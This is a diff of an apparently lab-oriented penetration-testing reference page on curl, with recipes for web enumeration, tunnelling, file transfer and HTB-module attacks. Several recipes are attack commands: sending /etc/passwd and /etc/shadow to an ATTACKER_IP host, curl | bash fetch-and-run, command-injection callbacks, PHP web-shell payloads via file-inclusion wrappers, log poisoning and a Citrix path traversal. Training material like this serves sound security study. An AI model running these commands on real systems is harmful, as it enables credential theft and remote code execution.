@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/curl.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Request the observed virtual host
+[Search this tool’s saved examples](/commands/notebook?tool=curl) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Request the observed virtual host
 
 **Run in:** Kali. **Requires:** Observed hostname and target address; plain HTTP port 80 in this example
 
@@ -21,13 +29,11 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 curl -sS --resolve 'app.lab.htb:80:10.129.10.10' -D evidence/web/app.headers -o evidence/web/app.body http://app.lab.htb/
 ```
 
-**Read the result:** The response belongs to the requested application host, assuming the server routes that hostname.
-
-**If Redirect to another hostname:** Inspect Location and resolve the intended application before following blindly.
+**What the result establishes:** The response belongs to the requested application host, assuming the server routes that hostname.
 
 **Next check:** Map features in the browser and capture a normal request.
 
-## Current operation: Replay an ordinary multipart upload
+## Replay an ordinary multipart upload
 
 **Run in:** Kali or the proxy request editor. **Requires:** A real sample.png, current session/token, and observed endpoint/field names
 
@@ -37,13 +43,11 @@ curl -sS --resolve 'app.lab.htb:80:10.129.10.10' -b 'SESSION=REPLACE_ME' \
   -D evidence/web/upload.headers -o evidence/web/upload.body http://app.lab.htb/upload
 ```
 
-**Read the result:** A server response that can be compared with the browser upload; record the returned object ID or path.
-
-**If Login/CSRF rejection:** Re-establish session and fresh token, then replay the unchanged baseline.
+**What the result establishes:** A server response that can be compared with the browser upload; record the returned object ID or path.
 
 **Next check:** Change one property and compare the resulting storage/retrieval behavior.
 
-## Current operation: Retrieve the object using its returned location
+## Retrieve the object using its returned location
 
 **Run in:** Kali. **Requires:** Observed retrieval URL/ID and the uploading identity; replace 123
 
@@ -52,13 +56,11 @@ curl -sS --resolve 'app.lab.htb:80:10.129.10.10' -b 'SESSION=REPLACE_ME' \
   -D evidence/web/retrieval.headers -o evidence/web/downloaded.bin http://app.lab.htb/files/123
 ```
 
-**Read the result:** Headers and returned bytes distinguish a stored object from a login/error response.
-
-**If HTTP success with unexpected HTML:** Read Content-Type and body; verify URL, identity and redirect behavior before comparing file hashes.
+**What the result establishes:** Headers and returned bytes distinguish a stored object from a login/error response.
 
 **Next check:** Compare bytes and processing, then evaluate ownership using available lab identities.
 
-## Current operation: Verify the forwarded application
+## Verify the forwarded application
 
 **Run in:** Another Kali terminal. **Requires:** Established tunnel with Kali loopback listener on 18080
 
@@ -67,13 +69,11 @@ ss -lntp | grep ':18080'
 curl -sS -D - http://127.0.0.1:18080/
 ```
 
-**Read the result:** A listener and application response comparable to the direct pivot baseline.
-
-**If Local connection works but backend fails:** Recheck the service directly from the pivot and confirm the destination host/port.
+**What the result establishes:** A listener and application response comparable to the direct pivot baseline.
 
 **Next check:** Record the exact tested connection before expanding to other services.
 
-## Current operation: Download a file and fail on HTTP errors
+## Download a file and fail on HTTP errors
 
 **Run in:** Kali. **Requires:** A working route, trusted TLS chain and permission to read the URL; required session headers are separate inputs.
 
@@ -81,139 +81,9 @@ curl -sS -D - http://127.0.0.1:18080/
 curl --fail --location --output file.bin 'https://HOST_FQDN/file.bin'
 ```
 
-**Read the result:** Separate status, headers and body, and preserve the method, cookies and content type needed by the application.
-
-**If The server returns a redirect, login page or HTTP error:** Shell quoting and URL/form encoding happen at different layers; -d sends form data while -F builds multipart content.
+**What the result establishes:** Separate status, headers and body, and preserve the method, cookies and content type needed by the application.
 
 **Next check:** Inspect the response chain and authentication context; verify the saved content before treating the transfer as complete.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://curl.se/docs/manpage.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## curl: choose the operation and read the result
-
-Request URLs and transfer files.
-
-### What the result establishes
-
-Separate status, headers and body, and preserve the method, cookies and content type needed by the application.
-
-### Prerequisites and common failures
-
-Shell quoting and URL/form encoding happen at different layers; -d sends form data while -F builds multipart content.
-
-### Example 1: Commands
-
-Run in: **Kali**. The upload command requires an uploadserver endpoint, not Python http.server.
-
-```bash
-curl -I http://TARGET_IP/
-curl -o file.zip http://TARGET_IP:8000/file.zip
-curl -X POST http://KALI_IP:8000/upload -F 'files=@file.zip'
-```
-
-### Example 2: Setup Steps
-
-Run in: **Saved lab example**.
-
-```bash
-curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt
-```
-
-Saved context: [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Web Upload (Python uploadserver with HTTPS)
-
-Run in: **Saved lab example**.
-
-```bash
-curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
-```
-
-Saved context: [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: wget and cURL
-
-Run in: **Saved lab example**.
-
-```bash
-wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
-curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
-```
-
-Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: wget and cURL
-
-Run in: **Saved lab example**.
-
-```bash
-curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
-wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
-```
-
-Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Quick Decision Tree
-
-Run in: **Saved lab example**.
-
-```text
-DOWNLOADING TO WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
-├── Only cmd.exe?       → certutil or bitsadmin
-├── Internal network?   → SMB (impacket-smbserver)
-├── Need fileless?      → IEX + DownloadString
-└── Nothing works?      → Base64 encode/decode via clipboard
-
-DOWNLOADING TO LINUX:
-├── Have curl/wget?     → Use them (simplest)
-├── Need fileless?      → curl | bash  or  wget -qO- | python3
-├── Have Python/PHP?    → Use language one-liners
-├── Nothing available?  → /dev/tcp bash trick
-└── Need encryption?    → OpenSSL s_server/s_client
-
-UPLOADING FROM WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
-├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
-├── Internal network?   → SMB or WebDAV
-└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
-
-UPLOADING FROM LINUX:
-├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
-├── Have SCP?           → scp file user@attacker:/path/
-├── Have Python?        → python3 requests.post one-liner
-└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
-```
-
-Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Detect it (manual)
-
-Run in: **Saved lab example**.
-
-```bash
-curl -sk "https://<TARGET>/vpn/../vpns/cfg/smb.conf"
-```
-
-Saved context: [Citrix NetScaler: CVE-2019-19781 Reference — Detect it (manual)](/enumeration/citrix-netscaler#detect-it-manual). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Request URLs and transfer files.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=curl) · [All tools](/index)
 
 ## Commands
 
@@ -225,20 +95,21 @@ curl -o file.zip http://TARGET_IP:8000/file.zip
 curl -X POST http://KALI_IP:8000/upload -F 'files=@file.zip'
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 1: Commands](/enumeration/citrix-netscaler#example-1-commands)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 The upload command requires an uploadserver endpoint, not Python http.server.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Redirect to another hostname | Inspect Location and resolve the intended application before following blindly. |
+| Login/CSRF rejection | Re-establish session and fresh token, then replay the unchanged baseline. |
+| HTTP success with unexpected HTML | Read Content-Type and body; verify URL, identity and redirect behavior before comparing file hashes. |
+| Local connection works but backend fails | Recheck the service directly from the pivot and confirm the destination host/port. |
+| The server returns a redirect, login page or HTTP error | Shell quoting and URL/form encoding happen at different layers; -d sends form data while -F builds multipart content. |
 
 ## Notebook recipes
 
-43 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+123 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -255,6 +126,26 @@ curl --fail --output federation.xml 'https://FEDERATION_HOST/FederationMetadata/
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [AD FS and SAML triage — Kali — read published federation metadata](/field/adfs#kali-—-read-published-federation-metadata)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Read federation as a trust relationship">
+
+### Read federation as a trust relationship
+
+**AD FS and SAML triage**
+
+```bash
+curl --fail --output federation.xml 'https://FEDERATION_HOST/FederationMetadata/2007-06/FederationMetadata.xml'
+xmllint --format federation.xml
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD FS and SAML triage — Read federation as a trust relationship](/field/adfs#read-federation-as-a-trust-relationship)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -308,6 +199,173 @@ ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
 
 </Accordion>
 
+<Accordion title="Apache Tomcat">
+
+### Apache Tomcat
+
+**Attacking Common Applications**
+
+```bash
+curl -u 'tomcat:PASSWORD' --upload-file app.war "http://TARGET_IP:8080/manager/text/deploy?path=/app"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Common Applications — Apache Tomcat](/web/common-applications#apache-tomcat)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Drupal">
+
+### Drupal
+
+**Attacking Common Applications**
+
+```bash
+curl -s http://TARGET_IP/CHANGELOG.txt | head -n 25
+droopescan scan drupal -u http://TARGET_IP/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Common Applications — Drupal](/web/common-applications#drupal)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Joomla">
+
+### Joomla
+
+**Attacking Common Applications**
+
+```bash
+curl -s http://TARGET_IP/administrator/manifests/files/joomla.xml | grep '<version>'
+curl -s http://TARGET_IP/README.txt | head -n 20
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Common Applications — Joomla](/web/common-applications#joomla)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="WordPress">
+
+### WordPress
+
+**Attacking Common Applications**
+
+```bash
+curl -s http://TARGET_IP/ | grep -i 'wp-content\|generator'
+wpscan --url http://TARGET_IP/ --enumerate u,ap,at --api-token YOUR_TOKEN
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Common Applications — WordPress](/web/common-applications#wordpress)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="2. Subdomain &amp; Virtual Host (VHost) Discovery">
+
+### 2. Subdomain & Virtual Host (VHost) Discovery
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+# Step 1: Measure the default response size for a guaranteed nonexistent VHost
+curl -s -I -H 'Host: nonexistent-vhost-9912.DOMAIN_FQDN' http://TARGET_IP/
+curl -s -H 'Host: nonexistent-vhost-9912.DOMAIN_FQDN' http://TARGET_IP/ | wc -c
+
+# Step 2: Fuzz VHosts and filter out the baseline byte size (-fs) or word count (-fw)
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+  -u http://TARGET_IP/ -H 'Host: FUZZ.DOMAIN_FQDN' -mc all -fs BASELINE_SIZE
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — 2. Subdomain & Virtual Host (VHost) Discovery](/web/ffuf-guide#2-subdomain-&-virtual-host-vhost-discovery)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Build an access matrix">
+
+### Build an access matrix
+
+**Authentication and Access Checks**
+
+```bash
+BASE='http://app.htb'
+curl -sS -D anon.headers -o anon.html "$BASE/profile"
+curl -sS -b account-a.cookies -D a.headers -o a.html "$BASE/profile"
+curl -sS -b account-b.cookies -D b.headers -o b.html "$BASE/profile"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Authentication and Access Checks — Build an access matrix](/web/auth-bypass#build-an-access-matrix)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Test object ownership with one controlled change">
+
+### Test object ownership with one controlled change
+
+**Authentication and Access Checks**
+
+```bash
+curl -sS -b account-a.cookies "$BASE/api/documents/101" -o a-own.json
+curl -sS -b account-a.cookies "$BASE/api/documents/202" -o a-other.json
+diff -u a-own.json a-other.json
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Authentication and Access Checks — Test object ownership with one controlled change](/web/auth-bypass#test-object-ownership-with-one-controlled-change)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Test role-restricted functions">
+
+### Test role-restricted functions
+
+**Authentication and Access Checks**
+
+```bash
+curl -sS -D - "$BASE/admin"
+curl -sS -b account-a.cookies -D - "$BASE/admin"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Authentication and Access Checks — Test role-restricted functions](/web/auth-bypass#test-role-restricted-functions)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="CE (BloodHound Community Edition, Docker) — current/recommended">
 
 ### CE (BloodHound Community Edition, Docker) — current/recommended
@@ -331,6 +389,48 @@ sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # on
 
 </Accordion>
 
+<Accordion title="Forward a single service instead">
+
+### Forward a single service instead
+
+**Chisel: Quick Tunnel Reference**
+
+```bash
+# Pivot: expose the pivot-reachable INTERNAL_IP:80 on workstation loopback:8081.
+./chisel client WORKSTATION_IP:8080 R:127.0.0.1:8081:INTERNAL_IP:80
+# Workstation:
+curl -I http://127.0.0.1:8081/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Chisel: Quick Tunnel Reference — Forward a single service instead](/pivoting/chisel#forward-a-single-service-instead)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Point one client at the SOCKS listener">
+
+### Point one client at the SOCKS listener
+
+**Chisel: Quick Tunnel Reference**
+
+```bash
+proxychains -f ./proxychains-lab.conf curl -I http://INTERNAL_IP/
+proxychains -f ./proxychains-lab.conf nmap -sT -Pn -n -p 80,445 INTERNAL_IP
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Chisel: Quick Tunnel Reference — Point one client at the SOCKS listener](/pivoting/chisel#point-one-client-at-the-socks-listener)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Detect it (manual)">
 
 ### Detect it (manual)
@@ -343,7 +443,7 @@ curl -sk "https://<TARGET>/vpn/../vpns/cfg/smb.conf"
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 7: Detect it (manual)](/enumeration/citrix-netscaler#example-7-detect-it-manual) · [Citrix NetScaler: CVE-2019-19781 Reference — Detect it (manual)](/enumeration/citrix-netscaler#detect-it-manual)
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Detect it (manual)](/enumeration/citrix-netscaler#detect-it-manual)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -368,6 +468,82 @@ sudo nmap -p443 -sV --script ssl-cert <TARGET>
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — How to spot it on a scan](/enumeration/citrix-netscaler#how-to-spot-it-on-a-scan)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Callback with a fixed marker">
+
+### Callback with a fixed marker
+
+**Command Injection**
+
+```text
+127.0.0.1;curl http://10.10.14.10:8000/cmdi-proof-01
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Callback with a fixed marker](/web/cmdi#callback-with-a-fixed-marker)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Capture and replay the real request">
+
+### Capture and replay the real request
+
+**Command Injection**
+
+```bash
+BASE='http://app.htb'
+curl -sS -D baseline.headers -o baseline.html \
+  --data-urlencode 'ip=127.0.0.1' "$BASE/check.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Capture and replay the real request](/web/cmdi#capture-and-replay-the-real-request)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injection**
+
+```bash
+curl -sS --data-urlencode 'ip=127.0.0.1;whoami' "$BASE/check.php"
+curl -sS --data-urlencode 'ip=127.0.0.1&&whoami' "$BASE/check.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Capture and replay the real request](/web/cmdi#capture-and-replay-the-real-request)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Repeated timing comparison">
+
+### Repeated timing comparison
+
+**Command Injection**
+
+```bash
+curl -sS -o /dev/null -w 'baseline: %{time_total}\n' \
+  --data-urlencode 'ip=127.0.0.1' "$BASE/check.php"
+curl -sS -o /dev/null -w 'delay: %{time_total}\n' \
+  --data-urlencode 'ip=127.0.0.1;sleep 3' "$BASE/check.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Repeated timing comparison](/web/cmdi#repeated-timing-comparison)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -566,6 +742,187 @@ curl -s https://<target>/.well-known/openid-configuration | jq .
 
 </Accordion>
 
+<Accordion title="Checking PHP Configurations">
+
+### Checking PHP Configurations
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+<!DOCTYPE html>
+
+<html lang="en">
+...SNIP...
+ <h2>Containers</h2>
+    W1BIUF0KCjs7Ozs7Ozs7O
+    ...SNIP...
+    4KO2ZmaS5wcmVsb2FkPQo=
+<p class="read-more">
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Checking PHP Configurations](/web/htb/file-inclusion#checking-php-configurations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Expect">
+
+### Expect
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Expect](/web/htb/file-inclusion#expect)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="FTP">
+
+### FTP
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
+...SNIP...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — FTP](/web/htb/file-inclusion#ftp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Input">
+
+### Input
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Input](/web/htb/file-inclusion#input)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Remote Code Execution">
+
+### Remote Code Execution
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Remote Code Execution](/web/htb/file-inclusion#remote-code-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Server Log Poisoning">
+
+### Server Log Poisoning
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+grcic550@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Server Log Poisoning](/web/htb/file-inclusion#server-log-poisoning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Server Logs/Configurations">
+
+### Server Logs/Configurations
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+
+...SNIP...
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Server Logs/Configurations](/web/htb/file-inclusion#server-logs/configurations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+
+...SNIP...
+export APACHE_RUN_USER=www-data
+export APACHE_RUN_GROUP=www-data
+# temporary state file location. This might be changed to /run in Wheezy+1
+export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
+export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
+export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Server Logs/Configurations](/web/htb/file-inclusion#server-logs/configurations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Quick Decision Tree">
 
 ### Quick Decision Tree
@@ -602,7 +959,7 @@ UPLOADING FROM LINUX:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -621,7 +978,7 @@ curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 2: Setup Steps](/enumeration/citrix-netscaler#example-2-setup-steps) · [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps)
+**Original note sections:** [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -640,7 +997,7 @@ curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/et
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 3: Web Upload (Python uploadserver with HTTPS)](/enumeration/citrix-netscaler#example-3-web-upload-python-uploadserver-with-https) · [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https)
+**Original note sections:** [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -660,7 +1017,7 @@ curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets out
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 4: wget and cURL](/enumeration/citrix-netscaler#example-4-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+**Original note sections:** [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -674,7 +1031,7 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 5: wget and cURL](/enumeration/citrix-netscaler#example-5-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+**Original note sections:** [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -685,7 +1042,7 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 
 ### Bypassing filters
 
-**File Upload Testing: Quick Reference**
+**File Upload Attacks**
 
 ```bash
 # find where it landed, then trigger
@@ -695,6 +1052,143 @@ curl "http://$IP/uploads/shell.php?c=id"
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [File Upload Attacks — Bypassing filters](/web/file-upload#bypassing-filters)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Confirm storage and retrieval">
+
+### Confirm storage and retrieval
+
+**File Upload Attacks**
+
+```bash
+curl -sS -D retrieved.headers -o retrieved.body \
+  "$BASE/profile_images/ACTUAL_STORED_NAME"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Confirm storage and retrieval](/web/file-upload#confirm-storage-and-retrieval)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Enumerate the upload feature first">
+
+### Enumerate the upload feature first
+
+**File Upload Attacks**
+
+```bash
+BASE='http://app.htb'
+curl -sS -D upload.headers -o upload-response.html \
+  -F 'uploadFile=@sample.png;type=image/png' "$BASE/upload.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Enumerate the upload feature first](/web/file-upload#enumerate-the-upload-feature-first)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Establish server-side execution in stages">
+
+### Establish server-side execution in stages
+
+**File Upload Attacks**
+
+```bash
+printf '%s' '<?php echo "upload-exec-proof"; ?>' > proof.php
